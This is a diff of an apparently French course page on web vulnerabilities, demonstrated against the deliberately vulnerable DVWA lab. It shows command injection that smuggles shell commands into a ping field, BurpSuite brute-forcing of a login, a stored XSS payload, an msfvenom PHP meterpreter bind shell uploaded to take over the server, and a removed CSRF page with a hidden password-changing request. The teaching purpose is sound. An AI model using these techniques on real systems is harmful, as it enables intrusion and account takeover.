@@ -563,15 +563,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      Cross Site Request Forgery (CSRF)
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#cross-site-scripting" class="md-nav__link">
     <span class="md-ellipsis">
       Cross Site Scripting
@@ -1935,15 +1926,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#cross-site-request-forgery-csrf" class="md-nav__link">
-    <span class="md-ellipsis">
-      Cross Site Request Forgery (CSRF)
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#cross-site-scripting" class="md-nav__link">
     <span class="md-ellipsis">
       Cross Site Scripting
@@ -1986,13 +1968,13 @@
 
 
 <h1 id="vulnerabilites-web">Vulnérabilités Web</h1>
-<p>L'ensemble des démonstrations de ce cours utilise une application Web nommée <em>Damn Vulnerable Web Application</em> ou DVWA. C'est une application avec des vulnérabilités pour tester notre habileté à les exploiter.  </p>
+<p>L'ensemble des démonstrations de ce cours utilise une application Web nommée <em>Damn Vulnerable Web Application</em> ou DVWA. C'est une application avec des vulnérabilités pour tester notre habileté à les exploiter.</p>
 <h2 id="execution-de-commandes">Exécution de commandes</h2>
 <p>Certaines applications Web utilisent les commandes du système d'exploitation pour offrir des services aux utilisateurs. Un pirate peut prendre avantage de ces applications pour exécuter des commandes non prévues.</p>
 <p>Dans DVWA, aller dans la section <em>Command Execution</em>.</p>
 <p><img alt="19-command-execution" src="../../images/2020/07/19-command-execution.png" /></p>
 <p>L'application permet de faire un ping.</p>
-<p>si on entre <code>192.168.40.7</code> :  </p>
+<p>si on entre <code>192.168.40.7</code> :</p>
 <p><img alt="19-command-execution-ping" src="../../images/2020/07/19-command-execution-ping.png" /></p>
 <p>Sous Linux, il est possible d'exécuter plusieurs commandes sur la même ligne avec l'opérateur &amp; ou |.</p>
 <p>Essayons de voir le contenu du répertoire courant avec <code>192.168.40.7 &amp; ls -la</code></p>
@@ -2002,88 +1984,70 @@
 <p>Nous nous trouvons dans quel répertoire? <code>192.168.40.7 | pwd</code></p>
 <p><img alt="19-command-execution-pwd" src="../../images/2020/07/19-command-execution-pwd.png" /></p>
 <p>Quelle version de Linux roule? <code>192.168.40.7 | uname -a</code></p>
-<p>Créons une nouvelle page Web :  <code>192.168.40.7 | echo "&lt;?php echo 'Salut la gang' ?&gt;" &gt; salut.php</code></p>
+<p>Créons une nouvelle page Web : <code>192.168.40.7 | echo "&lt;?php echo 'Salut la gang' ?&gt;" &gt; salut.php</code></p>
 <p>Essayons de voir le contenu du répertoire courant après la création du fichier avec <code>192.168.40.7 | ls -la</code></p>
 <p><img alt="19-command-execution-ls-la-apres-salut-php" src="../../images/2020/07/19-command-execution-ls-la-apres-salut-php.png" /></p>
-<p>Exécutons la nouvelle page :  </p>
+<p>Exécutons la nouvelle page :</p>
 <p><img alt="19-command-execution-salut-php" src="../../images/2020/07/19-command-execution-salut-php.png" /></p>
 <h3 id="source-de-la-vulnerabilite">Source de la vulnérabilité</h3>
 <p><img alt="19-command-execution-source" src="../../images/2020/07/19-command-execution-source.png" /></p>
 <h2 id="attaque-avec-une-force-brute">Attaque avec une force brute</h2>
-<p>Certaines application Web sont susceptibles à une attaque par force brute. Pour démontrer comment faire une telle attaque, nous allons utiliser BurpSuite.  </p>
-<p>Pour installer BurpSuite :  </p>
-<p><code>sudo apt install burpsuite</code> </p>
-<p>1 - Créer un projet temporaire :  </p>
+<p>Certaines application Web sont susceptibles à une attaque par force brute. Pour démontrer comment faire une telle attaque, nous allons utiliser BurpSuite.</p>
+<p>Pour installer BurpSuite :</p>
+<p><code>sudo apt install burpsuite</code></p>
+<p>1 - Créer un projet temporaire :</p>
 <p><img alt="20-burpsuite-projet-temporaire" src="../../images/2020/07/20-burpsuite-projet-temporaire.png" /></p>
-<p>2 - Démarrer Burp :  </p>
+<p>2 - Démarrer Burp :</p>
 <p><img alt="20-burpsuite-demarrer-burp" src="../../images/2020/07/20-burpsuite-demarrer-burp.png" /></p>
-<p>3 - Dans firefox, configurer le proxy :  </p>
+<p>3 - Dans firefox, configurer le proxy :</p>
 <p><img alt="20-firefox-proxy" src="../../images/2020/07/20-firefox-proxy.png" /></p>
 <p>4 - Dans firefox, accéder à la page de DVWA :</p>
-<p><img alt="19-firefox-brute-force" src="../../images/2020/07/19-firefox-brute-force.png" />  </p>
-<p>5 - Mettre intercept à on dans Burpsuite :  </p>
+<p><img alt="19-firefox-brute-force" src="../../images/2020/07/19-firefox-brute-force.png" /></p>
+<p>5 - Mettre intercept à on dans Burpsuite :</p>
 <p><img alt="20-burpsuite-intercept-on" src="../../images/2020/07/20-burpsuite-intercept-on.png" /></p>
-<p>6 - Dans firefox, entrer 'user1' et 'pass1' et cliquer sur <strong>login</strong> :  </p>
+<p>6 - Dans firefox, entrer 'user1' et 'pass1' et cliquer sur <strong>login</strong> :</p>
 <p><img alt="19-firefox-login-user1-pass1" src="../../images/2020/07/19-firefox-login-user1-pass1.png" /></p>
-<p>7 - Dans BurpSuite, sélectionner l'action <strong>send to intruder</strong> :  </p>
+<p>7 - Dans BurpSuite, sélectionner l'action <strong>send to intruder</strong> :</p>
 <p><img alt="19-burpsuite-send-to-intruder" src="../../images/2020/07/19-burpsuite-send-to-intruder.png" /></p>
-<p>8 - Sélectionner l'onglet <strong>intruder</strong>, le sous-onglet <strong>position</strong> et changer le type d'attaque pour <strong>cluster bomb</strong> :  </p>
+<p>8 - Sélectionner l'onglet <strong>intruder</strong>, le sous-onglet <strong>position</strong> et changer le type d'attaque pour <strong>cluster bomb</strong> :</p>
 <p><img alt="19-burpsuite-payload-position-attack-type" src="../../images/2020/07/19-burpsuite-payload-position-attack-type.png" /></p>
-<p>9 - Sélectionner <strong>user1</strong> et <strong>pass1</strong> :  </p>
+<p>9 - Sélectionner <strong>user1</strong> et <strong>pass1</strong> :</p>
 <p><img alt="19-burpsuite-positions-add" src="../../images/2020/07/19-burpsuite-positions-add.png" /></p>
-<p>10 - Dans l'onglet payloads, ajouter les codes utilisateurs dans le payload 1 et les mots de passe dans le payload 2 :  </p>
+<p>10 - Dans l'onglet payloads, ajouter les codes utilisateurs dans le payload 1 et les mots de passe dans le payload 2 :</p>
 <p><img alt="19-burpsuite-payload-1" src="../../images/2020/07/19-burpsuite-payload-1.png" /></p>
 <p><img alt="19-burpsuite-payload-2" src="../../images/2020/07/19-burpsuite-payload-2.png" /></p>
-<p>11 - Dans l'onglet options, ajouter un Grep - Match pour déterminer si l'attaque a réussi ou non :  </p>
+<p>11 - Dans l'onglet options, ajouter un Grep - Match pour déterminer si l'attaque a réussi ou non :</p>
 <p><img alt="19-burpsuite-option-grep-match" src="../../images/2020/07/19-burpsuite-option-grep-match.png" /></p>
-<p>12 - Lancer l'attaque :  </p>
+<p>12 - Lancer l'attaque :</p>
 <p><img alt="19-burpsuite-start-attack" src="../../images/2020/07/19-burpsuite-start-attack.png" /></p>
-<p>13 - Résultats de l'attaque, nous avons trouvé 1 mot de passe valide :  </p>
+<p>13 - Résultats de l'attaque, nous avons trouvé 1 mot de passe valide :</p>
 <p><img alt="19-burpsuite-attack-results" src="../../images/2020/07/19-burpsuite-attack-results.png" /></p>
-<h2 id="cross-site-request-forgery-csrf">Cross Site Request Forgery (CSRF)</h2>
-<p>Avec le CSRF, nous utilisons la session déjà authentifiée d'un utilisateur pour effectuer des actions malicieuses.  </p>
-<p>Voici donc une façon d'utiliser la session d'un utilisateur à son insu.  </p>
-<p>Créons une page avec le code suivant :  </p>
-<div class="highlight"><pre><span></span><code>&lt;!DOCTYPE html&gt;
- &lt;head&gt;
-  &lt;title&gt;Site malicieux&lt;/title&gt;
- &lt;/head&gt;
- &lt;body&gt;
-  &lt;h1&gt;Rien de malicieux ici, je le jure!&lt;/h1&gt;
-  &lt;img style=&quot;display:none&quot; src=&quot;http://192.168.40.14/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=change&quot; alt=&quot;&quot;&gt;
- &lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div>
-<p><img alt="19-csrf-site-malicieux" src="../../images/2020/11/19-csrf-site-malicieux.png" /></p>
-<p>En apparence, le site ne semble rien faire de grave. Regardons par contre les accès réseau de la page :  </p>
-<p><img alt="19-csrf-site-malicieux-reseau" src="../../images/2020/11/19-csrf-site-malicieux-reseau.png" /></p>
-<p>La seconde entrée, celle correspondant au tag img, appelle une page de changement de mot de passe de l'application Web. Si l'utilisateur est déjà authentifié, son mot de passe changera pour <strong>hack</strong>.  </p>
 <h2 id="cross-site-scripting">Cross Site Scripting</h2>
-<p>Les sites Web qui ont du contenu créé par les utilisateurs (par exemple un forum) peuvent permettre l'exécution de code Javascript injecté dans le contenu. De cette manière, un utilisateur malicieux peut exécuter du code sur le poste d'une victime lors de sa visite du site Web.  </p>
-<p>1 - Aller sur la page de XSS (stored) dans DVWA :  </p>
+<p>Les sites Web qui ont du contenu créé par les utilisateurs (par exemple un forum) peuvent permettre l'exécution de code Javascript injecté dans le contenu. De cette manière, un utilisateur malicieux peut exécuter du code sur le poste d'une victime lors de sa visite du site Web.</p>
+<p>1 - Aller sur la page de XSS (stored) dans DVWA :</p>
 <p><img alt="19-XSS-initial" src="../../images/2020/07/19-xss-initial.png" /></p>
-<p>2 - Écrire le payload dans le message :  </p>
-<p><code>&lt;script&gt;alert("Bonjour la planète")&lt;/script&gt;</code>  </p>
+<p>2 - Écrire le payload dans le message :</p>
+<p><code>&lt;script&gt;alert("Bonjour la planète")&lt;/script&gt;</code></p>
 <p><img alt="19-XSS-script-payload-alert" src="../../images/2020/07/19-xss-script-payload-alert.png" /></p>
 <p>3 - Résultats :</p>
 <p><img alt="19-XSS-alert-results" src="../../images/2020/07/19-xss-alert-results.png" /></p>
 <h2 id="upload">Upload</h2>
 <p>Si vous pouvez téléverser un fichier sur le serveur, vous pouvez prendre contrôle du serveur.</p>
-<p>1 - Créer un fichier avec un payload à l'aide de MSFVenom :  </p>
+<p>1 - Créer un fichier avec un payload à l'aide de MSFVenom :</p>
 <p><code>msfvenom -p php/meterpreter/bind_tcp lport=4444 -o mp.php</code></p>
 <p><img alt="19-msfvenom-php-meterpreter" src="../../images/2020/07/19-msfvenom-php-meterpreter.png" /></p>
-<p>2 - Aller sur la page upload de DVWA et téléverser mp.php :  </p>
+<p>2 - Aller sur la page upload de DVWA et téléverser mp.php :</p>
 <p><img alt="19-file-upload-mp-php" src="../../images/2020/07/19-file-upload-mp-php.png" /></p>
-<p>3 - Exécuter le fichier mp.php :  </p>
+<p>3 - Exécuter le fichier mp.php :</p>
 <p><img alt="19-execute-mp-php" src="../../images/2020/07/19-execute-mp-php.png" /></p>
-<p>4 - Lancer Metasploit avec le multi handler et le bon payload :  </p>
-<p><img alt="19-msfconsole-multi-handler-bind-tcp-meterpreter" src="../../images/2020/07/19-msfconsole-multi-handler-bind-tcp-meterpreter.png" />  </p>
+<p>4 - Lancer Metasploit avec le multi handler et le bon payload :</p>
+<p><img alt="19-msfconsole-multi-handler-bind-tcp-meterpreter" src="../../images/2020/07/19-msfconsole-multi-handler-bind-tcp-meterpreter.png" /></p>
 <div class="admonition important">
 <p class="admonition-title">Important</p>
-<p>Prenez quelques minutes pour faire votre <a href="../../outils/cartographie/">cartographie</a> de la leçon d'aujourd'hui!   </p>
 </div>
+<p>Prenez quelques minutes pour faire votre <a href="../../outils/cartographie/">cartographie</a> de la leçon d'aujourd'hui!</p>
 <h2 id="testez-vos-connaissances">Testez vos connaissances</h2>
-<p><a href="https://forms.office.com/r/Hymgvx9Avb">Petit quiz sur les vulnérabilités Web</a>  </p>
+<p><a href="https://forms.office.com/r/Hymgvx9Avb">Petit quiz sur les vulnérabilités Web</a></p>
 
 
 
